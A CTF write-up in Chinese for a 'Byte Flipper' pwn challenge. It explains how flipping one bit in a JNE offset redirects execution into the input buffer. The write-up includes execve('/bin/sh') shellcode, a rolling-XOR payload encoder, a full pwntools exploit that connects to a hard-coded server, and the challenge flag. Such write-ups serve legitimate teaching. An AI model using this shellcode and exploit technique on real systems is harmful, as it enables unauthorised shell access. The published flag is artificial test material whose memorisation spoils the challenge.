# CTF Writeup: 奪取_納米比亞 - Byte Flipper Challenge

## 📌 題目資訊
* **類別:** Binary / Pwn
* **目標檔案:** `chall_084b3455f35b2d205834ec063f7de208`
* **輔助腳本:** `exploit.py` (伺服器端環境模擬)
* **Flag:** `FLAG{ma5t3r_0f_fl1pp3r}`
* **核心概念:** SMC (Self-Modifying Code)、JMP-CALL-POP 技巧、1-Bit Flip Hijack、Shellcode 編寫。

## 🔍 1. 初始勘查 (Reconnaissance)

首先針對目標二進制檔進行基本檢查：

```bash
$ file chall
ELF 64-bit LSB executable, x86-64, statically linked, stripped

$ checksec chall
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x400080)
RWX:      Has RWX segments
```

**分析結論：** 這是一個**毫無防備**的 64 位元 Linux 執行檔。所有安全機制（Canary, PIE, NX）皆關閉，且具備 **RWX (可讀可寫可執行)** 的記憶體區段，這意味著只要我們能劫持控制流 (Control Flow)，就能直接在上面跑我們自己寫的 Shellcode。

## 📜 2. 遊戲規則分析 (exploit.py)

題目提供了一個 Python 腳本，揭示了這題的攻擊限制：
1. 程式允許我們在檔案偏移量 `0x80` 到 `0x139` 之間，選擇**一個位元組 (Byte)**。
2. 在該位元組中，選擇**一個位元 (Bit 0-7)** 進行翻轉 (XOR 1)。
3. 翻轉後執行程式。提示說："Flip one byte in the binary to get the shell."

## ⚙️ 3. 逆向工程與執行流程分析

由於檔案極小且為純組合語言編寫，我們直接使用 `objdump -d -M intel chall` 進行靜態分析。

### A. 定位輸入緩衝區 (JMP-CALL-POP)
```assembly
  400080:       eb 50                   jmp    0x4000d2
  ...
  4000d2:       e8 ab ff ff ff          call   0x400082
  4000d7:       (User Input Buffer Starts Here)
```
程式開頭利用 `jmp` 跳至 `call`，`call` 執行時會將下一道指令的位址（即 `0x4000d7`）推入 Stack。接著在 `0x40008d` 執行 `pop rsi`，藉此動態取得緩衝區的記憶體位址。程式隨後透過 `syscall` 讀取了 46 bytes 的使用者輸入至此處。

### B. 解密邏輯 (Rolling XOR)
```assembly
  400098:       48 0f b6 7e 01          movzx  rdi,BYTE PTR [rsi+0x1]
  40009d:       48 31 3e                xor    QWORD PTR [rsi],rdi
  4000a0:       48 ff c6                inc    rsi
  ...
  4000a6:       75 f0                   jne    0x400098
```
程式會將我們輸入的內容進行「就地解密」。演算法為：`目前字元 = 目前字元 ^ 下一個字元`。這代表我們輸入的 Shellcode 必須先經過相對應的「逆向加密」才能被正確還原。

### C. 致命的分支指令 (The Target)
```assembly
  4000b6:       f3 a6                   repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
  4000b8:       48 85 c9                test   rcx,rcx
  4000bb:       75 49                   jne    0x400106   <-- 【攻擊目標】
  ...
  4000d0:       eb 34                   jmp    0x400106
```
程式會驗證解密後的字串，若不相等 (`jne`) 則直接跳至 `0x400106` 結束程式。
**關鍵發現：** 整個程式中**不存在** `execve` 系統呼叫。我們必須迫使程式跳轉到我們的輸入緩衝區 (`0x4000d7`) 去執行我們自帶的 Shellcode。

## 🎯 4. 漏洞利用 (1-Bit Hijack)

我們無法猜透密碼，程式注定會執行 `4000bb: jne 0x400106`。
該指令的機器碼為 `75 49`。
* `75` 是 JNE 指令。
* `49` 是相對跳躍偏移量 (Offset)。目標位址計算：`0x4000bd (下一行指令位址) + 0x49 = 0x400106`。

如果我們修改這個 `0x49`，讓它跳進我們的緩衝區呢？
* `0x49` 的二進位是 `0100 1001`。
* 我們選擇翻轉**第 3 個位元 (Bit 3, value=8)**：`0x49 ^ 0x08 = 0x41`。
* 新的跳躍目標：`0x4000bd + 0x41 = 0x4000fe`。

`0x4000fe` 完美落入了我們的輸入緩衝區（位在第 39 byte 的位置）！

## 🚀 5. Payload 構造與 Exploit

我們取得了控制權，但 `0x4000fe` 距離緩衝區結尾只剩 7 bytes，放不下完整的 Shellcode。因此我們採用「兩段式」跳躍：

1. **Stage 1 (放在 0x4000fe):** 寫入 `jmp 0x4000d7` (`eb d7`)，跳回緩衝區開頭。
2. **Stage 2 (放在 0x4000d7):** 寫入極短版的 `execve("/bin/sh")` Shellcode (22 bytes)。
3. **加密 Payload:** 依照程式碼的 Rolling XOR 邏輯，從尾巴開始往回推算密文。

### 🐍 最終 Exploit 腳本 (solve.py)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 1. 取得加密用的邊界常數 (位在檔案偏移 0x105)
with open('./chall', 'rb') as f:
    f.seek(0x105)
    c46 = f.read(1)[0]

# 2. 準備 execve("/bin/sh") Shellcode
sc = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    push 59
    pop rax
    syscall
''')

# 3. 構造 46 bytes 的明文結構 (Plaintext)
P = bytearray(sc)
P += b'\x90' * (39 - len(P))  # NOP sled 到第 39 byte
P += b'\xeb\xd7'              # jmp 0x4000d7 (落在 0x4000fe 處)
P += b'\x90' * (46 - len(P))  # 填滿 46 bytes

# 4. 模擬 SMC 逆向加密 (Rolling XOR)
C = bytearray(46)
next_c = c46
for i in range(45, -1, -1):
    C[i] = P[i] ^ next_c
    next_c = C[i]

# 5. 執行連線與利用
p = remote('140.117.80.61', 4444)

# 翻轉檔案 offset 0xbc (即 0x49 所在位置) 的第 3 個 bit
p.sendlineafter(b"(0x80-0x139): ", b"bc")
p.sendlineafter(b"(7-0): ", b"3")

# 發送加密後的 Shellcode
p.send(C)

# 取得 Shell!
p.interactive()